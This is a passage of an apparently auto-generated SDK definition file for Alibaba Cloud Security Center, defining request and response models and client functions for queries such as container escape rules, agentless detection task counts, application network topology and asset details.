 * @summary Queries the details of a defense rule against container escapes.
 *
 * @description Only the Ultimate edition of Security Center supports this operation.
 *
 * @param request GetAegisContainerPluginRuleRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAegisContainerPluginRuleResponse
 */
async function getAegisContainerPluginRuleWithOptions(request: GetAegisContainerPluginRuleRequest, runtime: Util.RuntimeOptions): GetAegisContainerPluginRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.ruleType)) {
    query['RuleType'] = request.ruleType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAegisContainerPluginRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a defense rule against container escapes.
 *
 * @description Only the Ultimate edition of Security Center supports this operation.
 *
 * @param request GetAegisContainerPluginRuleRequest
 * @return GetAegisContainerPluginRuleResponse
 */
async function getAegisContainerPluginRule(request: GetAegisContainerPluginRuleRequest): GetAegisContainerPluginRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAegisContainerPluginRuleWithOptions(request, runtime);
}

model GetAegisContainerPluginRuleCriteriaRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  value?: string(name='Value', description='The value of the search condition.', example='ss'),
}

model GetAegisContainerPluginRuleCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the search condition. Valid values:

*   **instanceId**: the ID of the container instance.
*   **clusterId**: the cluster ID.
*   **regionId**: the ID of the region in which the container resides.
*   **clusterName**: the name of the cluster.
*   **clusterType**: the type of the cluster.
*   **hostIp**: the public IP address.
*   **pod**: the pod.
*   **podIp**: the IP address of the pod.
*   **containerId**: the container ID.
*   **containerScope**: the type of the container.', example='containerScope'),
      type?: string(name='Type', description='The type of the search condition. Valid values:

*   **input**: The search condition needs to be specified.
*   **select**: The search condition is an option that can be selected from the drop-down list.', example='select'),
      values?: string(name='Values', description='The values.', example='NO,YES'),
    }
  ](name='CriteriaList', description='The information about the search condition.'),
  requestId?: string(name='RequestId', description='The request ID.', example='DA8133CC-CCA0-5CF2-BF64-FE7D52C44***'),
}

model GetAegisContainerPluginRuleCriteriaResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAegisContainerPluginRuleCriteriaResponseBody(name='body'),
}

/**
 * @summary Queries search conditions that can be used to search for container file protection rules.
 *
 * @param request GetAegisContainerPluginRuleCriteriaRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAegisContainerPluginRuleCriteriaResponse
 */
async function getAegisContainerPluginRuleCriteriaWithOptions(request: GetAegisContainerPluginRuleCriteriaRequest, runtime: Util.RuntimeOptions): GetAegisContainerPluginRuleCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAegisContainerPluginRuleCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries search conditions that can be used to search for container file protection rules.
 *
 * @param request GetAegisContainerPluginRuleCriteriaRequest
 * @return GetAegisContainerPluginRuleCriteriaResponse
 */
async function getAegisContainerPluginRuleCriteria(request: GetAegisContainerPluginRuleCriteriaRequest): GetAegisContainerPluginRuleCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAegisContainerPluginRuleCriteriaWithOptions(request, runtime);
}

model GetAgentlessTaskCountRequest {
  target?: string(name='Target', description='The instance ID of the asset.', example='s-m5edddcwq7d57d******'),
  targetType?: int32(name='TargetType', description='Specifies the type of the object being inspected. Valid values:

*   **3**: User Snapshot.
*   **4**: User Image.', example='3'),
}

model GetAgentlessTaskCountResponseBody = {
  baselineCheckCount?: int32(name='BaselineCheckCount', description='The number of baseline checks.', example='1'),
  cveVulCount?: int32(name='CveVulCount', description='The number of system vulnerabilities.', example='1'),
  lastTaskTime?: long(name='LastTaskTime', description='The timestamp generated when the last detection is performed.', example='1682577532318'),
  maliciousFile?: int32(name='MaliciousFile', description='The number of malicious files.', example='1'),
  requestId?: string(name='RequestId', description='The request ID.', example='D03DD0FD-6041-5107-AC00-383E28F1****'),
  riskMachine?: int32(name='RiskMachine', description='The number of risky hosts.', example='1'),
  scaVulCount?: int32(name='ScaVulCount', description='The number of application vulnerabilities.', example='1'),
  scanMachine?: int32(name='ScanMachine', description='The number of hosts that are scanned.', example='1'),
  sensitiveFileCount?: int32(name='SensitiveFileCount', description='The total number of sensitive files.', example='1'),
  sysVulCount?: string(name='SysVulCount', description='The total number of Windows system vulnerabilities.', example='1'),
  vulnerability?: int32(name='Vulnerability', description='The number of vulnerabilities.', example='1'),
}

model GetAgentlessTaskCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAgentlessTaskCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of agentless detection tasks.
 *
 * @param request GetAgentlessTaskCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAgentlessTaskCountResponse
 */
async function getAgentlessTaskCountWithOptions(request: GetAgentlessTaskCountRequest, runtime: Util.RuntimeOptions): GetAgentlessTaskCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAgentlessTaskCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of agentless detection tasks.
 *
 * @param request GetAgentlessTaskCountRequest
 * @return GetAgentlessTaskCountResponse
 */
async function getAgentlessTaskCount(request: GetAgentlessTaskCountRequest): GetAgentlessTaskCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAgentlessTaskCountWithOptions(request, runtime);
}

model GetAlarmMachineCountRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to sas.', example='sas'),
}

model GetAlarmMachineCountResponseBody = {
  data?: {
    machineCount?: int32(name='MachineCount', description='The number of servers on which alerts are generated.', example='1'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='6D3A2E7D-1238-5DD4-B3C3-BF06FCAD****'),
}

model GetAlarmMachineCountResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAlarmMachineCountResponseBody(name='body'),
}

/**
 * @summary Queries the number of servers on which alerts are generated.
 *
 * @param request GetAlarmMachineCountRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAlarmMachineCountResponse
 */
async function getAlarmMachineCountWithOptions(request: GetAlarmMachineCountRequest, runtime: Util.RuntimeOptions): GetAlarmMachineCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAlarmMachineCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the number of servers on which alerts are generated.
 *
 * @param request GetAlarmMachineCountRequest
 * @return GetAlarmMachineCountResponse
 */
async function getAlarmMachineCount(request: GetAlarmMachineCountRequest): GetAlarmMachineCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAlarmMachineCountWithOptions(request, runtime);
}

model GetAppNetworkRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='cf77xxx'),
  endTime?: long(name='EndTime', description='The end timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1650470399999'),
  startTime?: long(name='StartTime', description='The start timestamp of the query. Unit: milliseconds.

> The days between the start timestamp and the end timestamp cannot exceed **seven** days.', example='1649260800000'),
}

model GetAppNetworkResponseBody = {
  appNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId', description='The ID of the destination node.', example='102'),
        dstNodeType?: string(name='DstNodeType', description='The type of the destination node. Valid values:

*   **app**: an application
*   **internet**: a network node in another cluster', example='app'),
        id?: string(name='Id', description='The ID of the edge.', example='3534'),
        port?: string(name='Port', description='The number of the destination port.', example='8080'),
        srcNodeId?: string(name='SrcNodeId', description='The ID of the source node.', example='101'),
        srcNodeType?: string(name='SrcNodeType', description='The type of the source node. Valid values:

*   **app**: an application
*   **internet**: a network node in another cluster', example='app'),
      }
    ](name='Edge', description='The information about the topology edge.'),
    namespace?: [ 
      {
        id?: string(name='Id', description='The ID of the namespace.', example='1'),
        name?: string(name='Name', description='The name of the custom namespace.', example='default'),
      }
    ](name='Namespace', description='The namespace.'),
    node?: [ 
      {
        containerIds?: [ string ](name='ContainerIds', description='The list of the container IDs.'),
        id?: string(name='Id', description='The ID of the node.', example='1274'),
        name?: string(name='Name', description='The name of the node.', example='console'),
        namespaceId?: string(name='NamespaceId', description='The ID of the namespace.', example='1'),
        riskLevel?: string(name='RiskLevel', description='The risk level. Valid values:

*   **3**: high
*   **2**: medium
*   **1**: low
*   **0**: warning
*   **-1**: unknown', example='0'),
        type?: string(name='Type', description='The type of the node. Valid values:

*   **app**: an application
*   **internet**: a network node in another cluster', example='app'),
      }
    ](name='Node', description='The information about the application node.'),
  }(name='AppNetwork', description='The information about the application network topology.'),
  requestId?: string(name='RequestId', description='The request ID.', example='7D46EDB0-xxx'),
}

model GetAppNetworkResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAppNetworkResponseBody(name='body'),
}

/**
 * @summary Queries the network topology between containerized applications.
 *
 * @param request GetAppNetworkRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAppNetworkResponse
 */
async function getAppNetworkWithOptions(request: GetAppNetworkRequest, runtime: Util.RuntimeOptions): GetAppNetworkResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAppNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the network topology between containerized applications.
 *
 * @param request GetAppNetworkRequest
 * @return GetAppNetworkResponse
 */
async function getAppNetwork(request: GetAppNetworkRequest): GetAppNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAppNetworkWithOptions(request, runtime);
}

model GetAssetDetailByUuidRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request. The system specifies this parameter.', example='120.245.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.

This parameter is required.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
}

model GetAssetDetailByUuidResponseBody = {
  assetDetail?: {
    assetType?: string(name='AssetType', description='The type of the server. Valid values:

*   **0**: ECS instance
*   **1**: Server Load Balancer (SLB) instance
*   **2**: NAT gateway
*   **3**: ApsaraDB RDS instance
*   **4**: ApsaraDB for MongoDB instance
*   **5**: ApsaraDB for Redis instance
*   **6**: image
*   **7**: container', example='0'),
    authModifyTime?: long(name='AuthModifyTime', description='The timestamp when Security Center is authorized to protect the asset. Unit: milliseconds.', example='1627974044000'),
    authVersion?: int32(name='AuthVersion', description='The edition of Security Center that is authorized to protect the server. Valid values:

*   **1**: Basic (Unauthorized).
*   **6**: Anti-virus.
*   **5**: Advanced.
*   **3**: Enterprise.
*   **7**: Ultimate.', example='7'),
    bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: Security Center is authorized to protect the asset.
*   **false**: Security Center is not authorized to protect the asset.', example='true'),
    clientStatus?: string(name='ClientStatus', description='The status of the Security Center agent. Valid values:

*   **pause**: The Security Center agent stops protecting your server.
*   **online**: The Security Center agent is protecting your server.
*   **offline**: The Security Center agent does not protect your server.', example='online'),
    clientSubStatus?: string(name='ClientSubStatus', description='The sub-status of the Security Center agent on the server. Valid values:

*   **online**: The Security Center agent on the asset is **enabled**.
*   **offline**: The Security Center agent on the asset is **disabled**.
*   **pause**: The Security Center agent is **suspended**.
*   **uninstalled**: The Security Center agent is **not installed**.
*   **stopped**: The asset is **shut down**.', example='online'),
    clientVersion?: string(name='ClientVersion', description='The version of the Security Center agent.', example='2.0.0'),
    cpu?: int32(name='Cpu', description='The number of CPU cores.', example='2'),
    cpuInfo?: string(name='CpuInfo', description='The details of the CPU.', example='Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHz'),
    createTime?: long(name='CreateTime', description='The timestamp when Security Center records the details of the server. Unit: milliseconds.', example='1603863599000'),
    diskInfoList?: [ 
      {
        diskName?: string(name='DiskName', description='The name of the disk.', example='/dev/vda1'),
        totalSize?: long(name='TotalSize', description='The total disk space. Unit: GB.', example='40'),
        totalSizeByte?: long(name='TotalSizeByte', description='The total disk space. Unit: bytes.', example='42140479488'),
        useSize?: long(name='UseSize', description='The amount of the used disk space. Unit: GB.', example='2'),
        useSizeByte?: long(name='UseSizeByte', description='The amount of the used disk space. Unit: bytes.', example='2998996992'),
      }
    ](name='DiskInfoList', description='The list of information about the disk.'),
    flag?: int32(name='Flag', description='Indicates whether the asset is provided by Alibaba Cloud. Valid values:

*   **0**: The server is provided by Alibaba Cloud.
*   **1**: The server is not provided by Alibaba Cloud.', example='0'),
    groupTrace?: string(name='GroupTrace', description='The group to which the server belongs. By default, the servers that are not grouped belong to the **Default** group.', example='default'),
    hostName?: string(name='HostName', description='The name of the host.', example='qewrqwerqs****'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6h7p2fgk6rkk0g****'),
    instanceName?: string(name='InstanceName', description='The name of the server.', example='i-fasdfasdfadfafa****'),
    internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='120.47.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='192.168.XX.XX'),
    ip?: string(name='Ip', description='The IP address that is assigned to the Elastic Compute Service (ECS) instance.', example='120.47.XX.XX'),
    ipList?: [ string ](name='IpList', description='An array that consists of the IP addresses of the server.'),
    kernel?: string(name='Kernel', description='The kernel version of the operating system.', example='4.18.0-80.11.2.el8_0.x86_64'),
    macList?: [ string ](name='MacList', description='An array that consists of the media access control (MAC) addresses of the server.'),
    mem?: int32(name='Mem', description='The memory size of the server. Unit: GB.', example='16'),
    memory?: long(name='Memory', description='The memory size of the server. Unit: MB.', example='16384'),
    os?: string(name='Os', description='The operating system type of the server.', example='linux'),
    osDetail?: string(name='OsDetail', description='The operating system version of the server.', example='Linux 64bit'),
    osName?: string(name='OsName', description='The name of the operating system that the server runs.', example='CentOS  7.4 64bit'),
    region?: string(name='Region', description='The region in which the server resides.', example='cn-shanghai'),
    regionId?: string(name='RegionId', description='The ID of the region in which the asset resides.', example='cn-hanghzou'),
    regionName?: string(name='RegionName', description='The name of the region in which the server resides.', example='China (Hohhot)'),
    sysInfo?: string(name='SysInfo', description='The operating system information about the server.', example='CentOS Linux 8.0.1905'),
    tag?: string(name='Tag', description='The tag that is added to the server.', example='InternetIp'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='9e6cad93-a379-46fd-a701-9bbf02f4****'),
    vendorAuthAlias?: string(name='VendorAuthAlias', description='The account to which the AccessKey pair belongs.

>  This parameter is returned only by third-party cloud servers. If the parameter value is empty, it will not be returned.', example='test'),
    vpcInstanceId?: string(name='VpcInstanceId', description='The ID of the virtual private cloud (VPC) in which the server resides.', example='vpc-bp1fs3bwonlfq503w****'),
  }(name='AssetDetail', description='The details of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4892B68B-47BC-5E56-B327-9C2ACC6C1C09'),
}

model GetAssetDetailByUuidResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAssetDetailByUuidResponseBody(name='body'),
}

/**
 * @summary Queries the details of a server and the extended information about the server by using the UUID of the server.
 *
 * @param request GetAssetDetailByUuidRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAssetDetailByUuidResponse
 */
async function getAssetDetailByUuidWithOptions(request: GetAssetDetailByUuidRequest, runtime: Util.RuntimeOptions): GetAssetDetailByUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetDetailByUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of a server and the extended information about the server by using the UUID of the server.
 *
 * @param request GetAssetDetailByUuidRequest
 * @return GetAssetDetailByUuidResponse
 */
async function getAssetDetailByUuid(request: GetAssetDetailByUuidRequest): GetAssetDetailByUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetDetailByUuidWithOptions(request, runtime);
}

model GetAssetSelectionConfigRequest {
  businessType?: string(name='BusinessType', description='The feature that is selected for the asset. Valid values:

*   **VIRUS_SCAN_CYCLE_CONFIG**: virus detection and removal
*   **VIRUS_SCAN_ONCE_TASK**: one-time scan for viruses
*   **AGENTLESS_MALICIOUS_WHITE_LIST_[ID]**: a whitelist rule for alerts that are detected by using the agentless detection feature
*   **AGENTLESS_VUL_WHITE_LIST_[ID]**: a whitelist rule for vulnerabilities that are detected by using the agentless detection feature
*   **FILE_PROTECT_RULE_SWITCH_TYPE_[ID]**: core file protectioion

This parameter is required.', example='VIRUS_SCAN_CYCLE_CONFIG'),
}

model GetAssetSelectionConfigResponseBody = {
  data?: {
    platform?: string(name='Platform', description='The operating system of the asset. Valid values:

*   **windows**
*   **linux**', example='linux'),
    selectionKey?: string(name='SelectionKey', description='The ID of the current asset selection. It can be used to query and modify the asset that is selected.', example='657c8411-4e89-446c-ab66-d45d1331****'),
    targetType?: string(name='TargetType', description='The dimension based on which the asset is selected. Valid values:

*   **instance**: The asset is selected by server.
*   **group**: The asset is selected by group.
*   **vpc**: The asset is selected by VPC.', example='instance'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='C5936B67-3EDF-53ED-A542-02543972449A'),
}

model GetAssetSelectionConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAssetSelectionConfigResponseBody(name='body'),
}

/**
 * @summary Queries asset selection configurations.
 *
 * @param request GetAssetSelectionConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAssetSelectionConfigResponse
 */
async function getAssetSelectionConfigWithOptions(request: GetAssetSelectionConfigRequest, runtime: Util.RuntimeOptions): GetAssetSelectionConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.businessType)) {
    query['BusinessType'] = request.businessType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetSelectionConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries asset selection configurations.
 *
 * @param request GetAssetSelectionConfigRequest
 * @return GetAssetSelectionConfigResponse
 */
async function getAssetSelectionConfig(request: GetAssetSelectionConfigRequest): GetAssetSelectionConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetSelectionConfigWithOptions(request, runtime);
}

model GetAssetsPropertyDetailRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **lkm**: kernel module
*   **autorun**: startup item
*   **web_server**: website

This parameter is required.', example='lkm'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  itemName?: string(name='ItemName', description='The name of the aggregation item for the asset fingerprint that you want to query.

> You can call the [GetAssetsPropertyItem](~~GetAssetsPropertyItem~~) operation to query the names of aggregation items.', example='virtio'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='20'),
  remark?: string(name='Remark', description='The name or IP address of the server.', example='1.2.XX.XX'),
  searchCriteriaList?: [ 
    {
      name?: string(name='Name', description='The name of the condition. Valid values:

*   **remarkItemName**: the aggregation item of the asset fingerprints. Fuzzy match is supported.

> *   If **Biz** is set to **web_server**, **remarkItemName** specifies a domain name. 
> *   If **Biz** is set to **lkm**, **remarkItemName** specifies a module name.
> *   If **Biz** is set to **autorun**, **remarkItemName** specifies the path to a startup item.', example='remarkItemName'),
      value?: string(name='Value', description='The value of the condition.', example='virtio'),
    }
  ](name='SearchCriteriaList', description='The conditions that are used to query the details about the asset fingerprint.'),
  uuid?: string(name='Uuid', description='The UUID of the server.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='38f72ea4-4c9f-4df1-bc6c-0f267614****'),
}

model GetAssetsPropertyDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='23'),
  }(name='PageInfo', description='The pagination information.'),
  propertys?: [ 
    {
      containerName?: string(name='ContainerName', description='The name of the container.', example='5-rce_web_1'),
      createTimestamp?: long(name='CreateTimestamp', description='The timestamp of the last fingerprint collection. Unit: milliseconds.', example='1649149566000'),
      domain?: string(name='Domain', description='The domain name of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='localhost'),
      filepath?: string(name='Filepath', description='The path to the kernel module file.

> This parameter is returned only when **Biz** is set to **lkm**.', example='/lib/modules/4****'),
      imageName?: string(name='ImageName', description='The name of the image.', example='registry-vpc.cn-beijing.aliyuncs.com/acs/aliyun-ingress-controller****'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-hp35tftuh52wbp1g****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='hc-host-****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='47.42.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='100.104.XX.XX'),
      ip?: string(name='Ip', description='The IP address of the server.', example='47.42.XX.XX'),
      listenProtocol?: string(name='ListenProtocol', description='The listening protocol that the website uses.

> This parameter is returned only when **Biz** is set to **web_server**.', example='tcp'),
      moduleName?: string(name='ModuleName', description='The name of the module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='alihids'),
      path?: string(name='Path', description='The path. The value of this parameter varies based on the value of **Biz**.

*   If **Biz** is set to **web_server**, the value of this parameter indicates the path to the website root directory.
*   If **Biz** is set to **autorun**, the value of this parameter indicates the path to the startup item.', example='/lib/systemd/system****'),
      pathMode?: string(name='PathMode', description='The permissions on the root directory of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='755'),
      pid?: string(name='Pid', description='The process ID (PID) of the process that runs the website service.

> This parameter is returned only when **Biz** is set to **web_server**.', example='813'),
      port?: string(name='Port', description='The port of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='80'),
      processStarted?: long(name='ProcessStarted', description='The timestamp generated when the process was started. Unit: milliseconds.

> This parameter is returned only when **Biz** is set to **web_server**.', example='1671186801000'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      serverType?: string(name='ServerType', description='The type of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='nginx'),
      size?: int32(name='Size', description='The size of the kernel module.

> This parameter is returned only when **Biz** is set to **lkm**.', example='10'),
      usedByCount?: int32(name='UsedByCount', description='The number of times that the kernel module is referenced.

> This parameter is returned only when **Biz** is set to **lkm**.', example='0'),
      user?: string(name='User', description='The user who started the process of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='root'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='162eb349-c2d9-4f8b-805c-75b43d4c****'),
      webPath?: string(name='WebPath', description='The path to the root directory of the website.

> This parameter is returned only when **Biz** is set to **web_server**.', example='/usr/share/nginx/html'),
    }
  ](name='Propertys', description='An array that consists of the details about the asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4C1AE3F3-18FA-4108-BBB9-AFA1A032****'),
}

model GetAssetsPropertyDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetAssetsPropertyDetailResponseBody(name='body'),
}

/**
 * @summary Queries the details about the asset fingerprints of the startup item, kernel module, or website type.
 *
 * @param request GetAssetsPropertyDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetAssetsPropertyDetailResponse
 */
async function getAssetsPropertyDetailWithOptions(request: GetAssetsPropertyDetailRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemName)) {
    query['ItemName'] = request.itemName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchCriteriaList)) {
    query['SearchCriteriaList'] = request.searchCriteriaList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about the asset fingerprints of the startup item, kernel module, or website type.
 *
 * @param request GetAssetsPropertyDetailRequest
 * @return GetAssetsPropertyDetailResponse
 */
async function getAssetsPropertyDetail(request: GetAssetsPropertyDetailRequest): GetAssetsPropertyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyDetailWithOptions(request, runtime);
}

model GetAssetsPropertyItemRequest {
  biz?: string(name='Biz', description='The type of the asset fingerprint that you want to query. Default value: **sca**. Valid values:

*   **lkm**: kernel module
*   **autorun**: startup item
